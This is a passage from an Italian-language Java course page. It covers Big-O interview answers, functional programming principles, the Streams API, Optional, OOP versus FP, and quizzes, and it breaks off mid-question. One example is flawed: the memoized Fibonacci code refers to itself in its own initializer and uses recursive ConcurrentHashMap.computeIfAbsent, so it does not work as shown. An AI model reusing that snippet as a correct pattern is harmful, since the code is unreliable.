                    <h4>Q: Qual è la differenza tra O(n) e O(n log n)? Quando diventa significativa?</h4>
                    <p><strong>Risposta attesa:</strong> O(n) è lineare: raddoppiando l'input, raddoppia il tempo. O(n log n) cresce leggermente più velocemente: log₂(1M) ≈ 20, quindi per 1M elementi è circa 20M operazioni vs 1M. La differenza diventa significativa con grandi dataset: per n=1 miliardo, O(n) = 1B operazioni, O(n log n) ≈ 30B operazioni (30x più lento). Tuttavia, per n piccoli (< 1000), le costanti nascoste nella notazione O possono dominare, e un algoritmo O(n log n) ben ottimizzato può battere un O(n) con costanti alte. Sempre profilare con dati reali.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Se dovessi scegliere tra un algoritmo O(n²) con space O(1) e uno O(n log n) con space O(n), cosa considereresti?</h4>
                    <p><strong>Risposta attesa:</strong> Dipende dal contesto. Fattori: 1) Dimensione dell'input: per n piccolo (< 100), O(n²) può essere più veloce per costanti minori. 2) Memoria disponibile: in sistemi embedded o con dati enormi, O(1) space può essere obbligatorio. 3) Cache locality: O(n²) in-place può avere migliore cache performance. 4) Parallelizzabilità: merge sort (O(n log n)) parallelizza bene. 5) Stabilità: se serve sorting stabile, influenza la scelta. In generale, per n > 1000 con memoria disponibile, O(n log n) è preferibile. Sempre chiedere i constraint specifici al colloquio.</p>
                </div>
            </section>

            <!-- Links Modulo 7 -->
            <section class="section" id="modulo7-links">
                <h2>Link di Approfondimento - Modulo 7</h2>

                <div class="info-box">
                    <h4>Algoritmi & Data Structures</h4>
                    <p><a href="https://visualgo.net/" target="_blank">VisuAlgo</a> - Visualizzazione algoritmi</p>
                    <p><a href="https://www.bigocheatsheet.com/" target="_blank">Big-O Cheat Sheet</a> - Complessità a colpo d'occhio</p>
                    <p><a href="https://www.baeldung.com/java-collections-complexity" target="_blank">Baeldung: Java Collections Complexity</a></p>
                </div>

                <div class="info-box">
                    <h4>LeetCode Problems (correlati)</h4>
                    <p><a href="https://leetcode.com/problems/lru-cache/" target="_blank">LeetCode 146: LRU Cache</a></p>
                    <p><a href="https://leetcode.com/problems/valid-parentheses/" target="_blank">LeetCode 20: Valid Parentheses</a></p>
                    <p><a href="https://leetcode.com/problems/merge-intervals/" target="_blank">LeetCode 56: Merge Intervals</a></p>
                </div>

                <div class="info-box">
                    <h4>Coding Interview Preparation</h4>
                    <p><a href="https://leetcode.com/explore/" target="_blank">LeetCode Explore</a> - Learning paths strutturati</p>
                    <p><a href="https://www.interviewcake.com/" target="_blank">Interview Cake</a> - Spiegazioni dettagliate</p>
                    <p><a href="https://www.educative.io/courses/grokking-the-coding-interview" target="_blank">Grokking the Coding Interview</a></p>
                </div>
            </section>

            <!-- ==================== MODULO 8: PARADIGMI DI PROGRAMMAZIONE ==================== -->

            <header class="module-header" id="modulo8">
                <span class="module-tag">Modulo 8</span>
                <h1>Paradigmi di Programmazione</h1>
                <p>Programmazione Funzionale, confronto con OOP e casi d'uso pratici in Java</p>
            </header>

            <!-- Functional Programming Section -->
            <section class="section" id="modulo8-functional">
                <h2>Programmazione Funzionale: Principi Fondamentali</h2>

                <p>La <strong>Programmazione Funzionale</strong> (FP) è un paradigma che tratta il calcolo come valutazione di funzioni matematiche, evitando stati mutabili e side effects. Mentre la OOP modella il mondo come oggetti con stato e comportamento, la FP modella il mondo come trasformazioni di dati.</p>

                <div class="info-box">
                    <h4>Perché la Programmazione Funzionale nel 2026?</h4>
                    <p>Con l'aumento della concorrenza (multi-core, distributed systems), la FP offre vantaggi significativi: codice senza side effects è naturalmente thread-safe, più facile da testare e da ragionare. Java ha abbracciato molti concetti FP da Java 8 in poi (Streams, Lambdas, Optional).</p>
                </div>

                <h3>I Pilastri della Programmazione Funzionale</h3>

                <h4>1. Pure Functions</h4>

                <p>Una <strong>pure function</strong> ha due caratteristiche:</p>
                <ul>
                    <li><strong>Deterministica</strong>: dato lo stesso input, produce sempre lo stesso output</li>
                    <li><strong>No side effects</strong>: non modifica stato esterno, non fa I/O, non muta gli argomenti</li>
                </ul>

                <pre><code class="language-java">// ❌ IMPURA: dipende da stato esterno
private double taxRate = 0.22;

public double calculateTax(double amount) {
    return amount * taxRate;  // Dipende da taxRate che può cambiare
}

// ❌ IMPURA: side effect (modifica stato esterno)
private List&lt;String&gt; logs = new ArrayList&lt;&gt;();

public int process(int x) {
    logs.add("Processing: " + x);  // Side effect!
    return x * 2;
}

// ✅ PURA: stesso input → stesso output, nessun side effect
public double calculateTax(double amount, double taxRate) {
    return amount * taxRate;
}

// ✅ PURA: trasforma input in output senza mutare nulla
public List&lt;Integer&gt; doubleAll(List&lt;Integer&gt; numbers) {
    return numbers.stream()
        .map(n -> n * 2)
        .toList();  // Ritorna NUOVA lista, non muta l'originale
}</code></pre>

                <h4>2. Immutability</h4>

                <p>In FP, i dati non vengono mai modificati dopo la creazione. Invece di mutare, si creano nuove versioni con le modifiche desiderate.</p>

                <pre><code class="language-java">// ❌ MUTABILE: l'oggetto può essere modificato
public class MutablePerson {
    private String name;
    private int age;

    public void setName(String name) { this.name = name; }
    public void setAge(int age) { this.age = age; }
}

// ✅ IMMUTABILE: una volta creato, non può cambiare
public record Person(String name, int age) {
    // I record Java sono immutabili per design

    // Per "modificare", crea una nuova istanza
    public Person withAge(int newAge) {
        return new Person(this.name, newAge);
    }
}

// Uso
Person alice = new Person("Alice", 30);
Person olderAlice = alice.withAge(31);  // alice resta invariata!

System.out.println(alice.age());       // 30
System.out.println(olderAlice.age());  // 31</code></pre>

                <div class="info-box success">
                    <h4>Vantaggi dell'Immutabilità</h4>
                    <ul>
                        <li><strong>Thread-safety gratis</strong>: oggetti immutabili possono essere condivisi tra thread senza sincronizzazione</li>
                        <li><strong>Nessun defensive copying</strong>: puoi passare riferimenti senza paura che vengano modificati</li>
                        <li><strong>Facile da testare</strong>: nessuno stato nascosto che cambia tra le chiamate</li>
                        <li><strong>Caching sicuro</strong>: puoi usare oggetti immutabili come chiavi di HashMap</li>
                    </ul>
                </div>

                <h4>3. First-Class Functions</h4>

                <p>Le funzioni sono "cittadini di prima classe": possono essere assegnate a variabili, passate come argomenti e ritornate da altre funzioni.</p>

                <pre><code class="language-java">// Funzione assegnata a una variabile
Function&lt;Integer, Integer&gt; double_ = x -> x * 2;
Function&lt;Integer, Integer&gt; square = x -> x * x;

// Funzione passata come argomento
public List&lt;Integer&gt; transform(List&lt;Integer&gt; list, Function&lt;Integer, Integer&gt; fn) {
    return list.stream().map(fn).toList();
}

List&lt;Integer&gt; numbers = List.of(1, 2, 3, 4);
transform(numbers, double_);  // [2, 4, 6, 8]
transform(numbers, square);   // [1, 4, 9, 16]

// Funzione che ritorna una funzione (Higher-Order Function)
public Function&lt;Integer, Integer&gt; multiplier(int factor) {
    return x -> x * factor;  // Closure: "cattura" factor
}

Function&lt;Integer, Integer&gt; triple = multiplier(3);
triple.apply(5);  // 15</code></pre>

                <h4>4. Higher-Order Functions</h4>

                <p>Le <strong>higher-order functions</strong> sono funzioni che prendono altre funzioni come argomenti o le ritornano. Le tre più importanti sono <code>map</code>, <code>filter</code> e <code>reduce</code>.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    HIGHER-ORDER FUNCTIONS                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  MAP: Trasforma ogni elemento                                                │
│  ─────────────────────────────                                               │
│  [1, 2, 3, 4]  ──map(x → x²)──▶  [1, 4, 9, 16]                             │
│                                                                              │
│  FILTER: Seleziona elementi che soddisfano un predicato                     │
│  ─────────────────────────────────────────────────────                       │
│  [1, 2, 3, 4]  ──filter(x → x%2==0)──▶  [2, 4]                              │
│                                                                              │
│  REDUCE: Combina tutti gli elementi in un singolo valore                    │
│  ─────────────────────────────────────────────────────                       │
│  [1, 2, 3, 4]  ──reduce(0, (acc,x) → acc+x)──▶  10                          │
│                                                                              │
│  COMPOSIZIONE (Pipeline):                                                    │
│  ─────────────────────────                                                   │
│  [1, 2, 3, 4, 5, 6]                                                         │
│       │                                                                      │
│       ▼  filter(x → x%2==0)                                                 │
│  [2, 4, 6]                                                                   │
│       │                                                                      │
│       ▼  map(x → x²)                                                        │
│  [4, 16, 36]                                                                 │
│       │                                                                      │
│       ▼  reduce(0, +)                                                       │
│  56                                                                          │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">List&lt;Integer&gt; numbers = List.of(1, 2, 3, 4, 5, 6);

// Pipeline funzionale
int result = numbers.stream()
    .filter(n -> n % 2 == 0)      // [2, 4, 6]
    .map(n -> n * n)               // [4, 16, 36]
    .reduce(0, Integer::sum);      // 56

// Equivalente imperativo (meno leggibile, più error-prone)
int sumImperative = 0;
for (int n : numbers) {
    if (n % 2 == 0) {
        sumImperative += n * n;
    }
}</code></pre>
            </section>

            <!-- Java Streams Section -->
            <section class="section" id="modulo8-streams">
                <h2>Java Streams API</h2>

                <p>La <strong>Streams API</strong> (introdotta in Java 8) porta la programmazione funzionale in Java, permettendo di processare collezioni in modo dichiarativo e potenzialmente parallelo.</p>

                <div class="info-box warning">
                    <h4>Stream ≠ Collection</h4>
                    <p>Uno Stream non è una struttura dati: è una <em>pipeline di operazioni</em> su dati. Non memorizza elementi, li processa on-demand (lazy evaluation). Uno Stream può essere consumato una sola volta.</p>
                </div>

                <h3>Operazioni Intermedie vs Terminali</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Tipo</th>
                            <th>Comportamento</th>
                            <th>Esempi</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Intermediate</strong></td>
                            <td>Lazy, ritornano Stream, concatenabili</td>
                            <td><code>filter</code>, <code>map</code>, <code>flatMap</code>, <code>sorted</code>, <code>distinct</code>, <code>limit</code></td>
                        </tr>
                        <tr>
                            <td><strong>Terminal</strong></td>
                            <td>Eager, "consumano" lo stream, producono risultato</td>
                            <td><code>collect</code>, <code>forEach</code>, <code>reduce</code>, <code>count</code>, <code>findFirst</code>, <code>anyMatch</code></td>
                        </tr>
                    </tbody>
                </table>

                <pre><code class="language-java">// Le operazioni intermedie sono LAZY: non eseguono nulla finché
// non c'è un'operazione terminale

List&lt;String&gt; names = List.of("Alice", "Bob", "Charlie", "David");

Stream&lt;String&gt; stream = names.stream()
    .filter(name -> {
        System.out.println("Filtering: " + name);
        return name.length() > 3;
    })
    .map(String::toUpperCase);

// Nulla è stato stampato! Lo stream è lazy.

// Ora aggiungiamo un'operazione terminale
List&lt;String&gt; result = stream.toList();
// Output:
// Filtering: Alice
// Filtering: Bob
// Filtering: Charlie
// Filtering: David
// result = ["ALICE", "CHARLIE", "DAVID"]</code></pre>

                <h3>Operazioni Comuni con Esempi</h3>

                <pre><code class="language-java">record Order(String customer, List&lt;Item&gt; items, double total, Status status) {}
record Item(String name, double price, int quantity) {}
enum Status { PENDING, SHIPPED, DELIVERED, CANCELLED }

List&lt;Order&gt; orders = getOrders();

// 1. FILTER + MAP + COLLECT: Nomi dei clienti con ordini > €100
List&lt;String&gt; bigSpenders = orders.stream()
    .filter(o -> o.total() > 100)
    .map(Order::customer)
    .distinct()
    .sorted()
    .toList();

// 2. FLATMAP: Tutti gli item di tutti gli ordini (appiattisce liste nested)
List&lt;Item&gt; allItems = orders.stream()
    .flatMap(o -> o.items().stream())
    .toList();

// 3. GROUPING: Ordini raggruppati per status
Map&lt;Status, List&lt;Order&gt;&gt; byStatus = orders.stream()
    .collect(Collectors.groupingBy(Order::status));

// 4. REDUCE: Totale di tutti gli ordini
double grandTotal = orders.stream()
    .mapToDouble(Order::total)
    .sum();  // Specializzazione per primitive (più efficiente)

// 5. PARTITIONING: Divide in due gruppi (true/false)
Map&lt;Boolean, List&lt;Order&gt;&gt; shipped = orders.stream()
    .collect(Collectors.partitioningBy(
        o -> o.status() == Status.SHIPPED || o.status() == Status.DELIVERED
    ));

// 6. STATISTICS: Statistiche in un colpo solo
DoubleSummaryStatistics stats = orders.stream()
    .mapToDouble(Order::total)
    .summaryStatistics();
// stats.getAverage(), stats.getMax(), stats.getMin(), stats.getSum(), stats.getCount()

// 7. COLLECTORS AVANZATI: Media dei totali per status
Map&lt;Status, Double&gt; avgByStatus = orders.stream()
    .collect(Collectors.groupingBy(
        Order::status,
        Collectors.averagingDouble(Order::total)
    ));

// 8. OPTIONAL: Trova il primo ordine non spedito (se esiste)
Optional&lt;Order&gt; firstPending = orders.stream()
    .filter(o -> o.status() == Status.PENDING)
    .findFirst();</code></pre>

                <h3>Optional: Gestione Null-Safety</h3>

                <p><strong>Optional</strong> è un container che può contenere o meno un valore. È il modo funzionale di gestire l'assenza di valore, evitando NullPointerException.</p>

                <pre><code class="language-java">// ❌ Approccio imperativo: null checks ovunque
public String getCustomerCity(Order order) {
    if (order != null) {
        Customer customer = order.getCustomer();
        if (customer != null) {
            Address address = customer.getAddress();
            if (address != null) {
                return address.getCity();
            }
        }
    }
    return "Unknown";
}

// ✅ Approccio funzionale con Optional
public String getCustomerCity(Order order) {
    return Optional.ofNullable(order)
        .map(Order::getCustomer)
        .map(Customer::getAddress)
        .map(Address::getCity)
        .orElse("Unknown");
}

// Operazioni comuni su Optional
Optional&lt;String&gt; name = Optional.of("Alice");
Optional&lt;String&gt; empty = Optional.empty();

// map: trasforma il valore se presente
Optional&lt;Integer&gt; length = name.map(String::length);  // Optional[5]

// filter: mantiene il valore solo se soddisfa il predicato
Optional&lt;String&gt; longName = name.filter(n -> n.length() > 3);  // Optional[Alice]

// orElse: valore di default se vuoto
String result = empty.orElse("Default");  // "Default"

// orElseGet: lazy evaluation del default (utile se costoso da calcolare)
String result2 = empty.orElseGet(() -> computeExpensiveDefault());

// orElseThrow: lancia eccezione se vuoto
String result3 = empty.orElseThrow(() -> new NotFoundException("Not found"));

// ifPresent: esegue azione solo se presente
name.ifPresent(n -> System.out.println("Hello, " + n));

// ifPresentOrElse (Java 9+): if-else funzionale
name.ifPresentOrElse(
    n -> System.out.println("Found: " + n),
    () -> System.out.println("Not found")
);</code></pre>

                <div class="info-box warning">
                    <h4>Anti-pattern con Optional</h4>
                    <ul>
                        <li><strong>Optional.get() senza controllo</strong>: usa sempre orElse/orElseThrow</li>
                        <li><strong>Optional come campo di classe</strong>: Optional non è Serializable, usa solo per return type</li>
                        <li><strong>Optional&lt;Collection&gt;</strong>: ritorna collezione vuota invece, non Optional di collezione</li>
                        <li><strong>isPresent() + get()</strong>: usa map/flatMap/orElse invece</li>
                    </ul>
                </div>

                <h3>Parallel Streams</h3>

                <p>Gli Stream possono essere eseguiti in parallelo per sfruttare CPU multi-core. Ma attenzione: non sempre conviene!</p>

                <pre><code class="language-java">// Sequenziale
long count = numbers.stream()
    .filter(n -> isPrime(n))
    .count();

// Parallelo: divide il lavoro tra i core disponibili
long countParallel = numbers.parallelStream()
    .filter(n -> isPrime(n))
    .count();

// Oppure converti uno stream esistente
long countParallel2 = numbers.stream()
    .parallel()
    .filter(n -> isPrime(n))
    .count();</code></pre>

                <div class="info-box">
                    <h4>Quando usare Parallel Streams?</h4>
                    <p>Usa parallel streams solo quando:</p>
                    <ul>
                        <li><strong>Dataset grande</strong>: l'overhead di parallelizzazione vale solo con molti elementi (>10.000)</li>
                        <li><strong>Operazioni CPU-intensive</strong>: filtri/map complessi, non semplici operazioni aritmetiche</li>
                        <li><strong>Nessun side effect</strong>: le operazioni devono essere stateless e thread-safe</li>
                        <li><strong>Fonte splittabile</strong>: ArrayList sì, LinkedList no (non può dividere efficientemente)</li>
                    </ul>
                    <p><strong>NON usare</strong> per operazioni I/O-bound (network, disk) o con collezioni piccole.</p>
                </div>
            </section>

            <!-- OOP vs FP Comparison Section -->
            <section class="section" id="modulo8-comparison">
                <h2>OOP vs Programmazione Funzionale</h2>

                <p>OOP e FP non sono mutualmente esclusivi: Java moderno li combina efficacemente. La chiave è scegliere l'approccio giusto per ogni situazione.</p>

                <h3>Confronto Filosofico</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Aspetto</th>
                            <th>OOP</th>
                            <th>Functional</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Unità base</strong></td>
                            <td>Oggetti (stato + comportamento)</td>
                            <td>Funzioni (trasformazioni)</td>
                        </tr>
                        <tr>
                            <td><strong>Stato</strong></td>
                            <td>Mutabile, incapsulato negli oggetti</td>
                            <td>Immutabile, passato esplicitamente</td>
                        </tr>
                        <tr>
                            <td><strong>Flusso</strong></td>
                            <td>Oggetti che si inviano messaggi</td>
                            <td>Dati che fluiscono attraverso funzioni</td>
                        </tr>
                        <tr>
                            <td><strong>Riuso</strong></td>
                            <td>Ereditarietà, composizione di oggetti</td>
                            <td>Composizione di funzioni</td>
                        </tr>
                        <tr>
                            <td><strong>Side effects</strong></td>
                            <td>Permessi e comuni</td>
                            <td>Evitati o isolati</td>
                        </tr>
                        <tr>
                            <td><strong>Concorrenza</strong></td>
                            <td>Richiede sincronizzazione esplicita</td>
                            <td>Naturalmente thread-safe (immutabilità)</td>
                        </tr>
                    </tbody>
                </table>

                <h3>Quando Usare Cosa</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    SCEGLIERE IL PARADIGMA GIUSTO                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  USA OOP QUANDO:                        USA FP QUANDO:                       │
│  ────────────────                       ─────────────────                    │
│  • Modelli entità del dominio           • Trasformi/processi dati           │
│    (User, Order, Product)               • Pipeline di elaborazione          │
│                                                                              │
│  • Hai stato che cambia nel tempo       • I dati sono immutabili            │
│    (carrello, sessione)                   (eventi, log, transazioni)        │
│                                                                              │
│  • Polimorfismo è centrale              • Composizione di operazioni        │
│    (Strategy, Template Method)            (map/filter/reduce)               │
│                                                                              │
│  • Framework richiede classi            • Alta concorrenza                  │
│    (Spring beans, JPA entities)           (parallel streams, reactive)      │
│                                                                              │
│  COMBINA ENTRAMBI (approccio Java moderno):                                 │
│  ──────────────────────────────────────────                                  │
│  • Domain objects (OOP) + service logic (FP)                                │
│  • Entities mutabili internamente, immutabili all'esterno (DTOs/Records)    │
│  • Streams per collezioni, Optional per null-safety                         │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Esempio Pratico: Stesso Problema, Due Approcci</h3>

                <pre><code class="language-java">// PROBLEMA: Calcola il totale degli ordini shipped per cliente

// ═══════════════════════════════════════════════════════════
// APPROCCIO OOP TRADIZIONALE
// ═══════════════════════════════════════════════════════════

public class OrderProcessor {
    private Map&lt;String, Double&gt; customerTotals = new HashMap&lt;&gt;();

    public void processOrders(List&lt;Order&gt; orders) {
        for (Order order : orders) {
            if (order.getStatus() == Status.SHIPPED) {
                String customer = order.getCustomer();
                double currentTotal = customerTotals.getOrDefault(customer, 0.0);
                customerTotals.put(customer, currentTotal + order.getTotal());
            }
        }
    }

    public Map&lt;String, Double&gt; getResults() {
        return new HashMap&lt;&gt;(customerTotals);  // Defensive copy
    }
}

// Uso
OrderProcessor processor = new OrderProcessor();
processor.processOrders(orders);
Map&lt;String, Double&gt; totals = processor.getResults();

// ═══════════════════════════════════════════════════════════
// APPROCCIO FUNZIONALE
// ═══════════════════════════════════════════════════════════

Map&lt;String, Double&gt; totals = orders.stream()
    .filter(o -> o.status() == Status.SHIPPED)
    .collect(Collectors.groupingBy(
        Order::customer,
        Collectors.summingDouble(Order::total)
    ));

// Vantaggi FP qui:
// - Una espressione, nessuno stato mutabile
// - Facilmente parallelizzabile: .parallelStream()
// - Più conciso e dichiarativo
// - Nessun bug da stato condiviso</code></pre>

                <h3>Composizione di Funzioni</h3>

                <p>In FP, le funzioni complesse si costruiscono componendo funzioni semplici. Java supporta questo con <code>Function.andThen()</code> e <code>Function.compose()</code>.</p>

                <pre><code class="language-java">// Funzioni base
Function&lt;String, String&gt; trim = String::trim;
Function&lt;String, String&gt; lowercase = String::toLowerCase;
Function&lt;String, String&gt; removeSpaces = s -> s.replace(" ", "_");

// Composizione: crea una pipeline di trasformazioni
Function&lt;String, String&gt; normalize = trim
    .andThen(lowercase)
    .andThen(removeSpaces);

normalize.apply("  Hello World  ");  // "hello_world"

// Predicati composti
Predicate&lt;Order&gt; isShipped = o -> o.status() == Status.SHIPPED;
Predicate&lt;Order&gt; isHighValue = o -> o.total() > 100;

// Combina predicati
Predicate&lt;Order&gt; isImportant = isShipped.and(isHighValue);
Predicate&lt;Order&gt; needsAttention = isShipped.negate().or(isHighValue);

orders.stream()
    .filter(isImportant)
    .forEach(System.out::println);</code></pre>

                <h3>Pattern Funzionali Comuni</h3>

                <pre><code class="language-java">// 1. CURRYING: funzione che ritorna funzione
// Utile per partial application
Function&lt;Double, Function&lt;Double, Double&gt;&gt; multiply =
    a -> b -> a * b;

Function&lt;Double, Double&gt; double_ = multiply.apply(2.0);
Function&lt;Double, Double&gt; triple = multiply.apply(3.0);

double_.apply(5.0);  // 10.0
triple.apply(5.0);   // 15.0

// 2. MEMOIZATION: cache dei risultati (per funzioni pure)
public class Memoizer&lt;T, R&gt; {
    private final Map&lt;T, R&gt; cache = new ConcurrentHashMap&lt;&gt;();

    public Function&lt;T, R&gt; memoize(Function&lt;T, R&gt; fn) {
        return input -> cache.computeIfAbsent(input, fn);
    }
}

// Uso: Fibonacci memoizzato
Function&lt;Integer, Long&gt; fib = new Memoizer&lt;Integer, Long&gt;()
    .memoize(n -> n &lt;= 1 ? n : fib.apply(n-1) + fib.apply(n-2));

// 3. EITHER: gestione errori funzionale (simula con sealed classes)
sealed interface Either&lt;L, R&gt; permits Left, Right {}
record Left&lt;L, R&gt;(L value) implements Either&lt;L, R&gt; {}
record Right&lt;L, R&gt;(R value) implements Either&lt;L, R&gt; {}

public Either&lt;String, User&gt; findUser(String id) {
    User user = repository.find(id);
    return user != null
        ? new Right&lt;&gt;(user)
        : new Left&lt;&gt;("User not found: " + id);
}

// Pattern matching (Java 21+)
String result = switch (findUser("123")) {
    case Right(User user) -> "Found: " + user.name();
    case Left(String error) -> "Error: " + error;
};</code></pre>
            </section>

            <!-- Quiz Section Modulo 8 -->
            <section class="quiz-section" id="modulo8-quiz">
                <h2>Interactive Challenge Quiz - Modulo 8</h2>
                <p>Verifica la tua comprensione della programmazione funzionale.</p>

                <!-- Question 36 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q1.</span> Quale delle seguenti funzioni è PURA?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q36" id="q36a" value="a">
                            <label for="q36a"><code>int count() { return counter++; }</code></label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q36" id="q36b" value="b">
                            <label for="q36b"><code>double random() { return Math.random(); }</code></label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q36" id="q36c" value="c">
                            <label for="q36c"><code>int add(int a, int b) { return a + b; }</code></label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q36" id="q36d" value="d">
                            <label for="q36d"><code>void log(String msg) { System.out.println(msg); }</code></label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q36')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q36"></div>
                </div>

                <!-- Question 37 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q2.</span> Hai uno stream di 1 milione di elementi. Quale operazione NON beneficia di <code>parallelStream()</code>?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q37" id="q37a" value="a">
                            <label for="q37a"><code>filter(isPrime)</code> dove isPrime è CPU-intensive</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q37" id="q37b" value="b">
                            <label for="q37b"><code>forEach(item -> httpClient.post(item))</code></label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q37" id="q37c" value="c">
                            <label for="q37c"><code>map(x -> complexCalculation(x))</code></label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q37" id="q37d" value="d">
                            <label for="q37d"><code>reduce(0, (a,b) -> a + b)</code></label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q37')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q37"></div>
                </div>

                <!-- Question 38 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q3.</span> Quale codice produce un bug silenzioso con Optional?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q38" id="q38a" value="a">
                            <label for="q38a"><code>optional.orElse("default")</code></label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q38" id="q38b" value="b">
                            <label for="q38b"><code>optional.map(String::toUpperCase)</code></label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q38" id="q38c" value="c">
                            <label for="q38c"><code>optional.orElseThrow()</code></label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q38" id="q38d" value="d">
                            <label for="q38d"><code>optional.orElse(expensiveComputation())</code></label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q38')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q38"></div>
                </div>

                <!-- Question 39 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q4.</span> Perché le operazioni intermedie degli Stream sono "lazy"?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q39" id="q39a" value="a">
                            <label for="q39a">Per ottimizzare: eseguono solo quando serve e possono fondere operazioni</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q39" id="q39b" value="b">
                            <label for="q39b">Per motivi di thread-safety: evitano race conditions</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q39" id="q39c" value="c">
                            <label for="q39c">Per compatibilità con versioni precedenti di Java</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q39" id="q39d" value="d">
                            <label for="q39d">Perché Java non può eseguire operazioni senza un return type</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q39')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q39"></div>
                </div>

                <!-- Question 40 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q5.</span> Qual è il principale vantaggio dell'immutabilità in ambienti multi-thread?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q40" id="q40a" value="a">
                            <label for="q40a">Riduce l'utilizzo di memoria grazie alla condivisione</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q40" id="q40b" value="b">
                            <label for="q40b">Permette al garbage collector di lavorare più efficientemente</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q40" id="q40c" value="c">
                            <label for="q40c">Elimina la necessità di sincronizzazione: nessuna race condition possibile</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q40" id="q40d" value="d">
                            <label for="q40d">Rende il codice più veloce grazie alle ottimizzazioni del compilatore</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q40')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q40"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 8 -->
            <section class="section" id="modulo8-questions">
                <h2>Domande da Colloquio - Modulo 8</h2>

                <div class="info-box">
                    <h4>Q: Cos'è una pure function e perché è importante?</h4>
                    <p><strong>Risposta attesa:</strong> Una pure function ha due proprietà: 1) È deterministica - dato lo stesso input, ritorna sempre lo stesso output. 2) Non ha side effects - non modifica stato esterno, non fa I/O, non muta gli argomenti. Sono importanti perché: sono facili da testare (nessun setup/mock necessario), thread-safe per natura (niente stato condiviso da sincronizzare), facili da ragionare (il comportamento dipende solo dagli argomenti), componibili (puoi combinarle liberamente), memoizzabili (puoi cachare i risultati).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Spiega la differenza tra <code>map</code> e <code>flatMap</code> negli Stream Java.</h4>
                    <p><strong>Risposta attesa:</strong> <code>map</code> trasforma ogni elemento in un altro elemento (1:1). <code>flatMap</code> trasforma ogni elemento in uno Stream e poi "appiattisce" tutti gli Stream risultanti in uno solo. Esempio: se hai <code>List&lt;Order&gt;</code> e ogni Order ha <code>List&lt;Item&gt;</code>, <code>map(Order::getItems)</code> dà <code>Stream&lt;List&lt;Item&gt;&gt;</code> (stream di liste), mentre <code>flatMap(o -> o.getItems().stream())</code> dà <code>Stream&lt;Item&gt;</code> (stream di item, appiattito). flatMap è essenziale per gestire strutture nested.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Quando useresti <code>orElse</code> vs <code>orElseGet</code> con Optional?</h4>
                    <p><strong>Risposta attesa:</strong> <code>orElse(value)</code> valuta sempre l'argomento, anche se Optional contiene un valore. <code>orElseGet(supplier)</code> è lazy: chiama il supplier solo se Optional è vuoto. Usa <code>orElseGet</code> quando il valore di default è costoso da calcolare (query DB, chiamata API, calcolo pesante). Esempio: <code>optional.orElse(repository.findDefault())</code> esegue SEMPRE la query, mentre <code>optional.orElseGet(() -> repository.findDefault())</code> la esegue solo se necessario.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come gestisci gli errori in modo funzionale in Java?</h4>
